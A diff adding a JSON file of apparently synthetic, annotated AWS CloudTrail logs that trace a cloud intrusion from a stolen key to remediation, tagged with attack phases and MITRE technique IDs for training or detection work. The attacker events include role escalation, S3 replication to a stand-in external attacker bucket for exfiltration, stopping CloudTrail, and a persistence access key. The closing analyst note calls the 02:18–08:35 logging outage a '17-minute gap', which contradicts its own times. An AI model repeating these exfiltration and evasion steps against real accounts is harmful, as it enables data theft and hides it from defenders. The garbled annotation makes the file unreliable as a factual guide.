@@ -1,0 +1,507 @@
+{
+  "Records": [
+    {
+      "eventVersion": "1.09",
+      "userIdentity": {
+        "type": "IAMUser",
+        "principalId": "AIDAIOSFODNN7EXAMPLE01",
+        "arn": "arn:aws:iam::123456789012:user/dev-alice",
+        "accountId": "123456789012",
+        "accessKeyId": "AKIAIOSFODNN7EXAMPLE"
+      },
+      "eventTime": "2024-11-14T02:14:07Z",
+      "eventSource": "sts.amazonaws.com",
+      "eventName": "GetCallerIdentity",
+      "awsRegion": "us-east-1",
+      "sourceIPAddress": "203.0.113.42",
+      "userAgent": "python-boto3/1.28.0 Python/3.11.0 Linux/5.15.0",
+      "requestParameters": null,
+      "responseElements": {
+        "userId": "AIDAIOSFODNN7EXAMPLE01",
+        "account": "123456789012",
+        "arn": "arn:aws:iam::123456789012:user/dev-alice"
+      },
+      "requestID": "11111111-0001-0001-0001-000000000001",
+      "eventID": "aaaaaaa1-0001-0001-0001-000000000001",
+      "eventType": "AwsApiCall",
+      "managementEvent": true,
+      "recipientAccountId": "123456789012",
+      "PHASE": "INITIAL_ACCESS",
+      "TECHNIQUE": "T1078.004",
+      "ANALYST_NOTE": "First use of compromised dev-alice key from external IP 203.0.113.42 at 02:14 UTC (off-hours). Attacker is verifying the credentials are live."
+    },
+    {
+      "eventVersion": "1.09",
+      "userIdentity": {
+        "type": "IAMUser",
+        "principalId": "AIDAIOSFODNN7EXAMPLE01",
+        "arn": "arn:aws:iam::123456789012:user/dev-alice",
+        "accountId": "123456789012",
+        "accessKeyId": "AKIAIOSFODNN7EXAMPLE"
+      },
+      "eventTime": "2024-11-14T02:14:32Z",
+      "eventSource": "iam.amazonaws.com",
+      "eventName": "GetUser",
+      "awsRegion": "us-east-1",
+      "sourceIPAddress": "203.0.113.42",
+      "userAgent": "python-boto3/1.28.0 Python/3.11.0 Linux/5.15.0",
+      "requestParameters": {"userName": "dev-alice"},
+      "responseElements": null,
+      "requestID": "11111111-0002-0002-0002-000000000002",
+      "eventID": "aaaaaaa2-0002-0002-0002-000000000002",
+      "eventType": "AwsApiCall",
+      "managementEvent": true,
+      "recipientAccountId": "123456789012",
+      "PHASE": "ENUMERATION",
+      "TECHNIQUE": "T1069.003"
+    },
+    {
+      "eventVersion": "1.09",
+      "userIdentity": {
+        "type": "IAMUser",
+        "principalId": "AIDAIOSFODNN7EXAMPLE01",
+        "arn": "arn:aws:iam::123456789012:user/dev-alice",
+        "accountId": "123456789012",
+        "accessKeyId": "AKIAIOSFODNN7EXAMPLE"
+      },
+      "eventTime": "2024-11-14T02:14:55Z",
+      "eventSource": "iam.amazonaws.com",
+      "eventName": "ListAttachedUserPolicies",
+      "awsRegion": "us-east-1",
+      "sourceIPAddress": "203.0.113.42",
+      "userAgent": "python-boto3/1.28.0 Python/3.11.0 Linux/5.15.0",
+      "requestParameters": {"userName": "dev-alice"},
+      "responseElements": null,
+      "requestID": "11111111-0003-0003-0003-000000000003",
+      "eventID": "aaaaaaa3-0003-0003-0003-000000000003",
+      "eventType": "AwsApiCall",
+      "managementEvent": true,
+      "recipientAccountId": "123456789012",
+      "PHASE": "ENUMERATION",
+      "TECHNIQUE": "T1069.003"
+    },
+    {
+      "eventVersion": "1.09",
+      "userIdentity": {
+        "type": "IAMUser",
+        "principalId": "AIDAIOSFODNN7EXAMPLE01",
+        "arn": "arn:aws:iam::123456789012:user/dev-alice",
+        "accountId": "123456789012",
+        "accessKeyId": "AKIAIOSFODNN7EXAMPLE"
+      },
+      "eventTime": "2024-11-14T02:15:10Z",
+      "eventSource": "iam.amazonaws.com",
+      "eventName": "ListRoles",
+      "awsRegion": "us-east-1",
+      "sourceIPAddress": "203.0.113.42",
+      "userAgent": "python-boto3/1.28.0 Python/3.11.0 Linux/5.15.0",
+      "requestParameters": null,
+      "responseElements": null,
+      "requestID": "11111111-0004-0004-0004-000000000004",
+      "eventID": "aaaaaaa4-0004-0004-0004-000000000004",
+      "eventType": "AwsApiCall",
+      "managementEvent": true,
+      "recipientAccountId": "123456789012",
+      "PHASE": "ENUMERATION",
+      "TECHNIQUE": "T1069.003",
+      "ANALYST_NOTE": "Attacker enumerates all roles; looking for assumable roles with elevated permissions."
+    },
+    {
+      "eventVersion": "1.09",
+      "userIdentity": {
+        "type": "IAMUser",
+        "principalId": "AIDAIOSFODNN7EXAMPLE01",
+        "arn": "arn:aws:iam::123456789012:user/dev-alice",
+        "accountId": "123456789012",
+        "accessKeyId": "AKIAIOSFODNN7EXAMPLE"
+      },
+      "eventTime": "2024-11-14T02:15:30Z",
+      "eventSource": "s3.amazonaws.com",
+      "eventName": "ListBuckets",
+      "awsRegion": "us-east-1",
+      "sourceIPAddress": "203.0.113.42",
+      "userAgent": "python-boto3/1.28.0 Python/3.11.0 Linux/5.15.0",
+      "requestParameters": null,
+      "responseElements": null,
+      "requestID": "11111111-0005-0005-0005-000000000005",
+      "eventID": "aaaaaaa5-0005-0005-0005-000000000005",
+      "eventType": "AwsApiCall",
+      "managementEvent": true,
+      "recipientAccountId": "123456789012",
+      "PHASE": "ENUMERATION",
+      "TECHNIQUE": "T1530"
+    },
+    {
+      "eventVersion": "1.09",
+      "userIdentity": {
+        "type": "IAMUser",
+        "principalId": "AIDAIOSFODNN7EXAMPLE01",
+        "arn": "arn:aws:iam::123456789012:user/dev-alice",
+        "accountId": "123456789012",
+        "accessKeyId": "AKIAIOSFODNN7EXAMPLE"
+      },
+      "eventTime": "2024-11-14T02:16:02Z",
+      "eventSource": "sts.amazonaws.com",
+      "eventName": "AssumeRole",
+      "awsRegion": "us-east-1",
+      "sourceIPAddress": "203.0.113.42",
+      "userAgent": "python-boto3/1.28.0 Python/3.11.0 Linux/5.15.0",
+      "requestParameters": {
+        "roleArn": "arn:aws:iam::123456789012:role/MeridianDataPipelineRole",
+        "roleSessionName": "attacker-session-1731549362",
+        "durationSeconds": 3600
+      },
+      "responseElements": {
+        "credentials": {
+          "accessKeyId": "ASIAIOSFODNN7EXAMPLE",
+          "sessionToken": "FQoDYXdzEJr//////////wEaDHexample...",
+          "expiration": "2024-11-14T03:16:02Z"
+        }
+      },
+      "requestID": "11111111-0006-0006-0006-000000000006",
+      "eventID": "aaaaaaa6-0006-0006-0006-000000000006",
+      "eventType": "AwsApiCall",
+      "managementEvent": true,
+      "recipientAccountId": "123456789012",
+      "PHASE": "PRIVILEGE_ESCALATION",
+      "TECHNIQUE": "T1078.004",
+      "ANALYST_NOTE": "Attacker assumes MeridianDataPipelineRole from dev-alice key. Now holds AmazonS3FullAccess. Key escalation step."
+    },
+    {
+      "eventVersion": "1.09",
+      "userIdentity": {
+        "type": "AssumedRole",
+        "principalId": "AROAIOSFODNN7EXAMPLE03:attacker-session-1731549362",
+        "arn": "arn:aws:sts::123456789012:assumed-role/MeridianDataPipelineRole/attacker-session-1731549362",
+        "accountId": "123456789012",
+        "sessionContext": {
+          "sessionIssuer": {
+            "type": "Role",
+            "principalId": "AROAIOSFODNN7EXAMPLE03",
+            "arn": "arn:aws:iam::123456789012:role/MeridianDataPipelineRole",
+            "accountId": "123456789012",
+            "userName": "MeridianDataPipelineRole"
+          },
+          "attributes": {
+            "creationDate": "2024-11-14T02:16:02Z",
+            "mfaAuthenticated": "false"
+          }
+        }
+      },
+      "eventTime": "2024-11-14T02:16:45Z",
+      "eventSource": "s3.amazonaws.com",
+      "eventName": "GetObject",
+      "awsRegion": "us-east-1",
+      "sourceIPAddress": "203.0.113.42",
+      "userAgent": "python-boto3/1.28.0 Python/3.11.0 Linux/5.15.0",
+      "requestParameters": {
+        "bucketName": "meridian-financial-reports-prod",
+        "key": "reports/Q3-2024-earnings.pdf"
+      },
+      "responseElements": null,
+      "requestID": "11111111-0007-0007-0007-000000000007",
+      "eventID": "aaaaaaa7-0007-0007-0007-000000000007",
+      "eventType": "AwsApiCall",
+      "managementEvent": false,
+      "recipientAccountId": "123456789012",
+      "PHASE": "COLLECTION",
+      "TECHNIQUE": "T1530"
+    },
+    {
+      "eventVersion": "1.09",
+      "userIdentity": {
+        "type": "AssumedRole",
+        "principalId": "AROAIOSFODNN7EXAMPLE03:attacker-session-1731549362",
+        "arn": "arn:aws:sts::123456789012:assumed-role/MeridianDataPipelineRole/attacker-session-1731549362",
+        "accountId": "123456789012"
+      },
+      "eventTime": "2024-11-14T02:16:52Z",
+      "eventSource": "s3.amazonaws.com",
+      "eventName": "GetObject",
+      "awsRegion": "us-east-1",
+      "sourceIPAddress": "203.0.113.42",
+      "userAgent": "python-boto3/1.28.0 Python/3.11.0 Linux/5.15.0",
+      "requestParameters": {
+        "bucketName": "meridian-financial-reports-prod",
+        "key": "reports/Q2-2024-earnings.pdf"
+      },
+      "responseElements": null,
+      "requestID": "11111111-0008-0008-0008-000000000008",
+      "eventID": "aaaaaaa8-0008-0008-0008-000000000008",
+      "eventType": "AwsApiCall",
+      "managementEvent": false,
+      "recipientAccountId": "123456789012",
+      "PHASE": "COLLECTION",
+      "TECHNIQUE": "T1530"
+    },
+    {
+      "eventVersion": "1.09",
+      "userIdentity": {
+        "type": "AssumedRole",
+        "principalId": "AROAIOSFODNN7EXAMPLE03:attacker-session-1731549362",
+        "arn": "arn:aws:sts::123456789012:assumed-role/MeridianDataPipelineRole/attacker-session-1731549362",
+        "accountId": "123456789012"
+      },
+      "eventTime": "2024-11-14T02:16:58Z",
+      "eventSource": "s3.amazonaws.com",
+      "eventName": "GetObject",
+      "awsRegion": "us-east-1",
+      "sourceIPAddress": "203.0.113.42",
+      "userAgent": "python-boto3/1.28.0 Python/3.11.0 Linux/5.15.0",
+      "requestParameters": {
+        "bucketName": "meridian-financial-reports-prod",
+        "key": "reports/Q1-2024-earnings.pdf"
+      },
+      "responseElements": null,
+      "requestID": "11111111-0009-0009-0009-000000000009",
+      "eventID": "aaaaaaa9-0009-0009-0009-000000000009",
+      "eventType": "AwsApiCall",
+      "managementEvent": false,
+      "recipientAccountId": "123456789012",
+      "PHASE": "COLLECTION",
+      "TECHNIQUE": "T1530"
+    },
+    {
+      "eventVersion": "1.09",
+      "userIdentity": {
+        "type": "AssumedRole",
+        "principalId": "AROAIOSFODNN7EXAMPLE03:attacker-session-1731549362",
+        "arn": "arn:aws:sts::123456789012:assumed-role/MeridianDataPipelineRole/attacker-session-1731549362",
+        "accountId": "123456789012"
+      },
+      "eventTime": "2024-11-14T02:17:05Z",
+      "eventSource": "s3.amazonaws.com",
+      "eventName": "GetObject",
+      "awsRegion": "us-east-1",
+      "sourceIPAddress": "203.0.113.42",
+      "userAgent": "python-boto3/1.28.0 Python/3.11.0 Linux/5.15.0",
+      "requestParameters": {
+        "bucketName": "meridian-financial-reports-prod",
+        "key": "internal/salaries/2024-compensation.xlsx"
+      },
+      "responseElements": null,
+      "requestID": "11111111-0010-0010-0010-000000000010",
+      "eventID": "aaaaaa10-0010-0010-0010-000000000010",
+      "eventType": "AwsApiCall",
+      "managementEvent": false,
+      "recipientAccountId": "123456789012",
+      "PHASE": "COLLECTION",
+      "TECHNIQUE": "T1530"
+    },
+    {
+      "eventVersion": "1.09",
+      "userIdentity": {
+        "type": "AssumedRole",
+        "principalId": "AROAIOSFODNN7EXAMPLE03:attacker-session-1731549362",
+        "arn": "arn:aws:sts::123456789012:assumed-role/MeridianDataPipelineRole/attacker-session-1731549362",
+        "accountId": "123456789012"
+      },
+      "eventTime": "2024-11-14T02:17:44Z",
+      "eventSource": "s3.amazonaws.com",
+      "eventName": "PutBucketReplication",
+      "awsRegion": "us-east-1",
+      "sourceIPAddress": "203.0.113.42",
+      "userAgent": "python-boto3/1.28.0 Python/3.11.0 Linux/5.15.0",
+      "requestParameters": {
+        "bucketName": "meridian-financial-reports-prod",
+        "ReplicationConfiguration": {
+          "Role": "arn:aws:iam::123456789012:role/MeridianDataPipelineRole",
+          "Rules": [
+            {
+              "ID": "AttackerReplication",
+              "Status": "Enabled",
+              "Filter": {},
+              "Destination": {
+                "Bucket": "arn:aws:s3:::attacker-staging-exfil-bucket",
+                "Account": "999999999999",
+                "AccessControlTranslation": {"Owner": "Destination"}
+              }
+            }
+          ]
+        }
+      },
+      "responseElements": null,
+      "requestID": "11111111-0011-0011-0011-000000000011",
+      "eventID": "aaaaaa11-0011-0011-0011-000000000011",
+      "eventType": "AwsApiCall",
+      "managementEvent": true,
+      "recipientAccountId": "123456789012",
+      "PHASE": "EXFILTRATION",
+      "TECHNIQUE": "T1537",
+      "ANALYST_NOTE": "CRITICAL: S3 replication rule added pointing to external account 999999999999. This is the exfiltration step — all future objects in the bucket will also replicate to the attacker's bucket."
+    },
+    {
+      "eventVersion": "1.09",
+      "userIdentity": {
+        "type": "AssumedRole",
+        "principalId": "AROAIOSFODNN7EXAMPLE03:attacker-session-1731549362",
+        "arn": "arn:aws:sts::123456789012:assumed-role/MeridianDataPipelineRole/attacker-session-1731549362",
+        "accountId": "123456789012"
+      },
+      "eventTime": "2024-11-14T02:18:05Z",
+      "eventSource": "cloudtrail.amazonaws.com",
+      "eventName": "StopLogging",
+      "awsRegion": "us-east-1",
+      "sourceIPAddress": "203.0.113.42",
+      "userAgent": "python-boto3/1.28.0 Python/3.11.0 Linux/5.15.0",
+      "requestParameters": {
+        "name": "meridian-main-trail"
+      },
+      "responseElements": null,
+      "requestID": "11111111-0012-0012-0012-000000000012",
+      "eventID": "aaaaaa12-0012-0012-0012-000000000012",
+      "eventType": "AwsApiCall",
+      "managementEvent": true,
+      "recipientAccountId": "123456789012",
+      "PHASE": "DEFENSE_EVASION",
+      "TECHNIQUE": "T1562.008",
+      "ANALYST_NOTE": "CRITICAL: Attacker attempts to stop CloudTrail logging to cover tracks. The StopLogging call itself is logged (CloudTrail logs the last event before stopping). This is why StopLogging should trigger an immediate alert."
+    },
+    {
+      "eventVersion": "1.09",
+      "userIdentity": {
+        "type": "AssumedRole",
+        "principalId": "AROAIOSFODNN7EXAMPLE03:attacker-session-1731549362",
+        "arn": "arn:aws:sts::123456789012:assumed-role/MeridianDataPipelineRole/attacker-session-1731549362",
+        "accountId": "123456789012"
+      },
+      "eventTime": "2024-11-14T02:18:30Z",
+      "eventSource": "iam.amazonaws.com",
+      "eventName": "CreateAccessKey",
+      "awsRegion": "us-east-1",
+      "sourceIPAddress": "203.0.113.42",
+      "userAgent": "python-boto3/1.28.0 Python/3.11.0 Linux/5.15.0",
+      "requestParameters": {
+        "userName": "dev-alice"
+      },
+      "responseElements": {
+        "accessKey": {
+          "userName": "dev-alice",
+          "accessKeyId": "AKIAI7SFODNN7EXAMPLE",
+          "status": "Active",
+          "createDate": "2024-11-14T02:18:30Z"
+        }
+      },
+      "requestID": "11111111-0013-0013-0013-000000000013",
+      "eventID": "aaaaaa13-0013-0013-0013-000000000013",
+      "eventType": "AwsApiCall",
+      "managementEvent": true,
+      "recipientAccountId": "123456789012",
+      "PHASE": "PERSISTENCE",
+      "TECHNIQUE": "T1098",
+      "ANALYST_NOTE": "Attacker creates a second access key for dev-alice as a persistence mechanism. Even if the original key is revoked, this new key provides continued access."
+    },
+    {
+      "eventVersion": "1.09",
+      "userIdentity": {
+        "type": "IAMUser",
+        "principalId": "AIDAIOSFODNN7EXAMPLE09",
+        "arn": "arn:aws:iam::123456789012:user/soc-analyst",
+        "accountId": "123456789012",
+        "accessKeyId": "AKIAI8SFODNN7EXAMPLE"
+      },
+      "eventTime": "2024-11-14T08:30:00Z",
+      "eventSource": "iam.amazonaws.com",
+      "eventName": "UpdateAccessKey",
+      "awsRegion": "us-east-1",
+      "sourceIPAddress": "10.0.0.5",
+      "userAgent": "aws-cli/2.13.0 Python/3.11.0 Darwin/23.0.0 botocore/2.13.0",
+      "requestParameters": {
+        "userName": "dev-alice",
+        "accessKeyId": "AKIAIOSFODNN7EXAMPLE",
+        "status": "Inactive"
+      },
+      "responseElements": null,
+      "requestID": "11111111-0014-0014-0014-000000000014",
+      "eventID": "aaaaaa14-0014-0014-0014-000000000014",
+      "eventType": "AwsApiCall",
+      "managementEvent": true,
+      "recipientAccountId": "123456789012",
+      "PHASE": "REMEDIATION",
+      "ANALYST_NOTE": "SOC analyst disables the compromised original key at 08:30 UTC (6 hours after first attacker use). The second key (AKIAI7SFODNN7EXAMPLE) is not yet revoked."
+    },
+    {
+      "eventVersion": "1.09",
+      "userIdentity": {
+        "type": "IAMUser",
+        "principalId": "AIDAIOSFODNN7EXAMPLE09",
+        "arn": "arn:aws:iam::123456789012:user/soc-analyst",
+        "accountId": "123456789012",
+        "accessKeyId": "AKIAI8SFODNN7EXAMPLE"
+      },
+      "eventTime": "2024-11-14T08:31:15Z",
+      "eventSource": "iam.amazonaws.com",
+      "eventName": "UpdateAccessKey",
+      "awsRegion": "us-east-1",
+      "sourceIPAddress": "10.0.0.5",
+      "userAgent": "aws-cli/2.13.0 Python/3.11.0 Darwin/23.0.0 botocore/2.13.0",
+      "requestParameters": {
+        "userName": "dev-alice",
+        "accessKeyId": "AKIAI7SFODNN7EXAMPLE",
+        "status": "Inactive"
+      },
+      "responseElements": null,
+      "requestID": "11111111-0015-0015-0015-000000000015",
+      "eventID": "aaaaaa15-0015-0015-0015-000000000015",
+      "eventType": "AwsApiCall",
+      "managementEvent": true,
+      "recipientAccountId": "123456789012",
+      "PHASE": "REMEDIATION",
+      "ANALYST_NOTE": "SOC analyst disables the persistence key. Both keys now inactive."
+    },
+    {
+      "eventVersion": "1.09",
+      "userIdentity": {
+        "type": "IAMUser",
+        "principalId": "AIDAIOSFODNN7EXAMPLE09",
+        "arn": "arn:aws:iam::123456789012:user/soc-analyst",
+        "accountId": "123456789012",
+        "accessKeyId": "AKIAI8SFODNN7EXAMPLE"
+      },
+      "eventTime": "2024-11-14T08:33:00Z",
+      "eventSource": "s3.amazonaws.com",
+      "eventName": "DeleteBucketReplication",
+      "awsRegion": "us-east-1",
+      "sourceIPAddress": "10.0.0.5",
+      "userAgent": "aws-cli/2.13.0 Python/3.11.0 Darwin/23.0.0 botocore/2.13.0",
+      "requestParameters": {
+        "bucketName": "meridian-financial-reports-prod"
+      },
+      "responseElements": null,
+      "requestID": "11111111-0016-0016-0016-000000000016",
+      "eventID": "aaaaaa16-0016-0016-0016-000000000016",
+      "eventType": "AwsApiCall",
+      "managementEvent": true,
+      "recipientAccountId": "123456789012",
+      "PHASE": "REMEDIATION",
+      "ANALYST_NOTE": "SOC analyst removes the attacker's S3 replication rule. Exfiltration channel closed."
+    },
+    {
+      "eventVersion": "1.09",
+      "userIdentity": {
+        "type": "IAMUser",
+        "principalId": "AIDAIOSFODNN7EXAMPLE09",
+        "arn": "arn:aws:iam::123456789012:user/soc-analyst",
+        "accountId": "123456789012",
+        "accessKeyId": "AKIAI8SFODNN7EXAMPLE"
+      },
+      "eventTime": "2024-11-14T08:35:00Z",
+      "eventSource": "cloudtrail.amazonaws.com",
+      "eventName": "StartLogging",
+      "awsRegion": "us-east-1",
+      "sourceIPAddress": "10.0.0.5",
+      "userAgent": "aws-cli/2.13.0 Python/3.11.0 Darwin/23.0.0 botocore/2.13.0",
+      "requestParameters": {
+        "name": "meridian-main-trail"
+      },
+      "responseElements": null,
+      "requestID": "11111111-0017-0017-0017-000000000017",
+      "eventID": "aaaaaa17-0017-0017-0017-000000000017",
+      "eventType": "AwsApiCall",
+      "managementEvent": true,
+      "recipientAccountId": "123456789012",
+      "PHASE": "REMEDIATION",
+      "ANALYST_NOTE": "SOC analyst re-enables CloudTrail. Note the 17-minute gap (02:18 – 08:35) where logging was stopped."
+    }
+  ]
+}
